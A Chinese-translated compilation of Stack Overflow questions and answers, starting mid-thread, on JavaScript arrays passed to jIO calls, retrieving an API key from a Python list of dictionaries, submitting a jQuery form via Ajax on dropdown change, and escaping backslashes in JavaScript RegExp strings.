            "a9dac9ff5c8e1b2fce58e5397e9b6a8de729d5c6eff8f26a7b71df6348986123",
            fake_id_1,
            fake_id_0
            ]}
    },
    function(err, response) { 
       // run tests
    }); 
```

但是，当我第二次调用相同的函数时：

```
o.jio.put({
    "content":'a_deleted_version',
    "_id":'myDoc',
    "_rev":"3-05210795b6aa8cb5e1e7f021960d233cf963f1052b1a41777ca1a2aff8fd4b61",
    "_revs_info":[   {"rev":"3-05210795b6aa8cb5e1e7f021960d233cf963f1052b1a41777ca1a2aff8fd4b61","status":"deleted"},{"rev":"2-67ac10df5b7e2582f2ea2344b01c68d461f44b98fef2c5cba5073cc3bdb5a844","status":"deleted"},{"rev":fake_rev_2,"status":"deleted"}],
    "_revisions":{
        "start":3,
        "ids":[
            "05210795b6aa8cb5e1e7f021960d233cf963f1052b1a41777ca1a2aff8fd4b61",
            "67ac10df5b7e2582f2ea2344b01c68d461f44b98fef2c5cba5073cc3bdb5a844",
            fake_id_2
            ]}

    },
    function(err, response) {
      // run tests
    }); 
```

我的脚本失败，因为`_revs_info`数组不包含任何内容。我添加的所有其他参数和所有随机参数都被传输。如果我添加一个`string`或`object`而不是一个，`array`他们也可以安全地将其添加到我的脚本中。

然而数组......没有通过......

**问题：**
我已经坐了几个小时试图确定我没有找到的点，但我很无能为力。那么有谁知道原因，为什么`arrays`在 Javascript 中将它们作为参数传递时可能会丢失它们的内容？

谢谢！

**编辑**：我在第一个之后
添加了一个常规，它通过了很好（没有被定义）。`PUT``SYNC-PUT``_revs_info`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-26T03:39:04.507

JavaScript 函数完全有可能改变传入的数组。考虑这个例子：

```
function removeAll(a) { a.splice(0); }

var arr = [1, 2, 3];
removeAll(arr);
console.log(arr); // empty array 
```

# python - 从字典列表中检索值

> ID：13957986
> 
> 赞同：1
> 
> 时间：2012-12-19T17:37:23.043
> 
> 标签：python

我有一个消费者列表：

```
API_CONSUMERS = [{'name': 'localhost',
                  'host': '127.0.0.1:5000',
                  'api_key': 'Ahth2ea5Ohngoop5'},
                 {'name': 'localhost2',
                  'host': '127.0.0.1:5001',
                  'api_key': 'Ahth2ea5Ohngoop6'}] 
```

我有一个主机变量：

```
host = '127.0.0.1:5000' 
```

我想要：

1.  检查主机是否在 API_CONSUMERS 列表中的值中，然后
2.  如果主机存在，则检索以`api_key`在其他地方使用。

最初我是这样检查主机值的：

```
if not any(consumer['host'] == host for consumer in API_CONSUMERS):
    #do something 
```

但后来意识到要检索`api_key`我无论如何都必须遍历每个消费者，所以不妨将两者结合起来：

```
for consumer_info in API_CONSUMERS:
    if consumer_info['host'] == host:
        consumer = consumer_info
if not consumer:
    #do something 
```

做这个的最好方式是什么？我觉得我在做的不是“pythonic”。

**解决方案**

```
try:
    api_key = next(d['api_key'] for d in consumers if d['host'] == host)
except StopIteration:
    #do something 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-19T17:40:32.360

```
>>> next(consumer['api_key'] for consumer in API_CONSUMERS if consumer['host'] == host)
'Ahth2ea5Ohngoop5' 
```

如果找不到值，不要忘记捕获将引发的异常。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-19T17:41:21.037

```
api_key = next(d['api_key'] for d in API_CONSUMERS if d['host'] == host) 
```

将一次性获取密钥，如果列表中没有此类主机，则会引发异常。

**编辑**

正如 sr2222 所指出的，如果主机不是唯一的，则 OP 代码和我的代码的语义是不同的。因此，要获得最后一个主机，可以执行以下操作：

```
api_key = [d['api_key'] for d in API_CONSUMERS if d['host'] == host][-1] 
```

或者只保留整个列表。（如果列表为空，仍会引发异常）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-19T17:39:27.230

一个（也许）更多的 python 构造是使用 for-else：

```
for consumer_info in API_CONSUMERS:
    if consumer_info['host'] == host:
        consumer = consumer_info
        #do stuff with consumer
        break
else:
    #clause if no consumer 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-19T17:52:31.617

如果你想有最有效的搜索过程，你应该使用**字典**数据结构。因为它的复杂性（增长顺序）是最少的。你可以这样做：

```
API_CONSUMERS = {'127.0.0.1:5000':{'name':'localhost','api_key': 'Ahth2ea5Ohngoop5'},
                 '127.0.0.1:5001': {'name':'localhost2','api_key': 'Ahth2ea5Ohngoop6'}} 
```

如果你想搜索使用：

```
if host in API_CONSUMERS.keys():
    return API_CONSUMERS[host]['api_key'] 
```

# jquery - 使用 Ajax 提交关于下拉更改的表单

> ID：13957993
> 
> 赞同：2
> 
> 时间：2012-12-19T17:37:50.943
> 
> 标签：jquery, ajax

我有以下调用另一个文件并根据下拉值吐出输出。它工作正常，但我似乎无法在没有提交按钮的情况下正常工作。这有效，除了它将自己重定向到`process.php`正确的输出。这段代码的重点是在空的 div ( `output`) 中显示输出。

```
$(document).ready(function() {
   $('#dropdown').change( function() {
       $('#myform').submit();
       $.ajax({ // create an AJAX call...
           data: $(this).serialize(), // get the form data
           type: $(this).attr('method'), // GET or POST
           url: $(this).attr('action'), // the file to call
           success: function(response) { // on success..
               $('#output').html(response); // update the DIV
           }
       });
       return false; // cancel original event to prevent form submitting
    });
});

<form id="myform" method=POST action="process.php">
<select id="dropdown" name="dropdown">
    <option value="QU">QU</option>
    <option value="QF">QF</option>
    <option value="QC">QC</option>
</select>
</form>
<div id="output"></div> 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-19T17:42:01.270

如果您想使用 ajax 则不要提交表单，在下拉更改事件`this`中也是下拉元素而不是表单。

```
$(document).ready(function() {
   $('#dropdown').change( function() {
       $.ajax({ // create an AJAX call...
           data: $('#myform').serialize(), // serialize the form
           type: $('#myform').attr('method'), // GET or POST from the form
           url: $('#myform').attr('action'), // the file to call from the form
           success: function(response) { // on success..
               $('#output').html(response); // update the DIV
           }
       });
    });
}); 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-12-19T17:47:07.837

我认为 JQuery 加载功能可以用更少的代码完成你所追求的。

```
$(document).ready(function() {
   $('#dropdown').change( function() {

    $('#output').load('/process.php',{dropdown: $(this).val()});

    });
});

<select id="dropdown" name="dropdown">
    <option value="QU">QU</option>
    <option value="QF">QF</option>
    <option value="QC">QC</option>
</select> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-19T17:44:06.287

你必须这样做：

这是在做什么：

1.  更改下拉菜单
2.  使用ajax，所以我们必须防止表单提交的默认行为`prevDef()`
3.  然后你的ajax 调用 which`submits the value`和`process it to process.php`输出`response on process.php gets loaded``#output div`

    ```
    $(document).ready(function() {
      $('#dropdown').change( function() {
           $.ajax({ // create an AJAX call...
               data: $(this).serialize(), // get the form data
               type: $(this).attr('method'), // GET or POST
               url: $(this).attr('action'), // the file to call
               success: function(response) { // on success..
                   $('#output').html(response); // update the DIV
               }
           });
        });
    }); 
    ```

# javascript - 新的正则表达式不起作用

> ID：13957998
> 
> 赞同：7
> 
> 时间：2012-12-19T17:38:13.127
> 
> 标签：javascript, regex

我正在尝试将以下表达式转换为“new Regexp()”样式：

[http://jsfiddle.net/HDWBZ/](http://jsfiddle.net/HDWBZ/)

```
var Wyrazenie = /\btest[a-z]*/g; 
```

我真的很困惑，不知道如何解决它。以下是我所做的，但显然它不起作用。

```
var Wyraznie = new RegExp("\btest[a-z]*","g"); 
```

还有一个问题，如果我使用变量而不是“测试”，它会是什么样子？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-12-19T17:39:33.823

你应该改用这个...

```
new RegExp("\\btest[a-z]*", "g"); 
```

... as`\b`将在 JavaScript 解析器通过相应的字符串文字工作时插入到*单个（无斜杠）字符中。*解决方案是逃避斜线本身。

**演示：http:** [//jsfiddle.net/HDWBZ/1/](http://jsfiddle.net/HDWBZ/1/)